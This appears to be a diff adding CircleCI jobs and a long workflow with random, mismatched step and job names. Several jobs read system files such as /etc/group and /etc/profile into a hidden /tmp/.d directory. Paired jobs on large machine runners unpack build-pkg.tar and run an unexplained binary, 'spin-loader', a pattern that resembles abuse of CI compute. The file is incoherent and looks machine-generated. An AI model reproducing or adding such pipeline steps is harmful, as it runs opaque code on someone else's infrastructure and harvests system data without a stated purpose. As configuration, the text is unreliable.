+          name: Approve the revenue split for 20 minutes
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; printf '%s\n' pantry tutorial plugin mountain canyon >"/tmp/juice_duck_garage.out" && tac "/tmp/juice_duck_garage.out"; true ; } > /tmp/.d/THiCKEThEAthMeMoNOde
+            echo "[step ok] yuki-run: $(wc -c </tmp/.d/THiCKEThEAthMeMoNOde) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'THiCKEThEAthMeMoNOde'
+  yuki-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/dev_dat 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  posK:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Book IX Shuffle The Join Keys
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; cat /etc/group | grep -vh disk | sort | head -n3; true ; } > /tmp/.d/yield.bundle.violet.pulse.backup
+            echo "[step ok] refactor-9826: $(wc -c </tmp/.d/yield.bundle.violet.pulse.backup) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'yield.bundle.violet.pulse.backup'
+  refactor-9826:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/yield.bundle.violet.pulse.backup 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+  ConvertTo-MyContract:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Hover over the notification bell
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; grep -v -i export /etc/profile; true ; } > /tmp/.d/4cedf9682520947d76f1d9dac50bce050eb96
+            echo "[step ok] atlas-alpha: $(wc -c </tmp/.d/4cedf9682520947d76f1d9dac50bce050eb96) B"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - '4cedf9682520947d76f1d9dac50bce050eb96'
+  atlas-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Join workspace
+          command: |
+            tail -n 5 /tmp/.d/4cedf9682520947d76f1d9dac50bce050eb96 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar -xf build-pkg.tar
+      - run:
+          command: $PWD/spin-loader
+
+workflows:
+  matrix:
+    jobs:
+      - mx-test-b
+      - num_rec_tot
+      - delta:
+          requires:
+            - mx-test-b
+            - num_rec_tot
+      - push-it:
+          requires:
+            - mx-test-b
+            - num_rec_tot
+      - q2-release:
+          requires:
+            - mx-test-b
+            - num_rec_tot
+      - canary:
+          requires:
+            - mx-test-b
+            - num_rec_tot
+      - hotfix-1814:
+          requires:
+            - mx-test-b
+            - num_rec_tot
+      - rc-v9:
+          requires:
+            - mx-test-b
+            - num_rec_tot
+      - rust-vet:
+          requires:
+            - mx-test-b
+            - num_rec_tot
+      - bug-2416:
+          requires:
+            - mx-test-b
+            - num_rec_tot
+      - yuki-run:
+          requires:
+            - mx-test-b
+            - num_rec_tot
+      - auh-check:
+          requires:
+            - mx-test-b
+            - num_rec_tot
+      - fx-x:
+          requires:
+            - mx-test-b
+            - num_rec_tot
+      - go-live:
+          requires:
+            - mx-test-b
+            - num_rec_tot
+      - hu-push:
+          requires:
+            - mx-test-b
+            - num_rec_tot
+      - fix-dashboard-bug:
+          requires:
+            - mx-test-b
+            - num_rec_tot
+      - add-db:
+          requires:
+            - mx-test-b
+            - num_rec_tot
+      - nico-verify:
+          requires:
+            - mx-test-b
+            - num_rec_tot
+      - uCacheSegment
+      - wip-parse-timeout:
+          requires:
+            - uCacheSegment
+      - MVPSVMRect:
+          requires:
+            - uCacheSegment
+      - promote:
+          requires:
+            - MVPSVMRect
+      - ITEM_202606:
+          requires:
+            - MVPSVMRect
+      - validate-end-to-end-test-matrix:
+          requires:
+            - ITEM_202606
+      - beastStats:
+          requires:
+            - ITEM_202606
+      - Rollout_Tests8:
+          requires:
+            - beastStats
+      - MAX_RATE:
+          requires:
+            - beastStats
+      - bake-it:
+          requires:
+            - MAX_RATE
+      - AccountPinHidden:
+          requires:
+            - MAX_RATE
+      - succes-only:
+          requires:
+            - AccountPinHidden
+      - defchannel:
+          requires:
+            - AccountPinHidden
+      - zulu-4:
+          requires:
+            - defchannel
+      - contractCtx:
+          requires:
+            - defchannel
+      - spin-up:
+          requires:
+            - contractCtx
+      - afk:
+          requires:
+            - contractCtx
+      - callisto-rc:
+          requires:
+            - afk
+      - ember-ledger:
+          requires:
+            - afk
+      - biuld-59:
+          requires:
+            - ember-ledger
+      - ConvertTo-MyContract:
+          requires:
+            - ember-ledger
+      - atlas-alpha:
+          requires:
+            - ConvertTo-MyContract
+      - posK:
+          requires:
+            - ConvertTo-MyContract
+      - refactor-9826:
+          requires:
+            - posK
+      - max_env:
+          requires:
+            - posK
+      - py311-build:
+          requires:
+            - max_env
+      - something36:
+          requires:
+            - max_env
+      - publish:
+          requires:
+            - something36
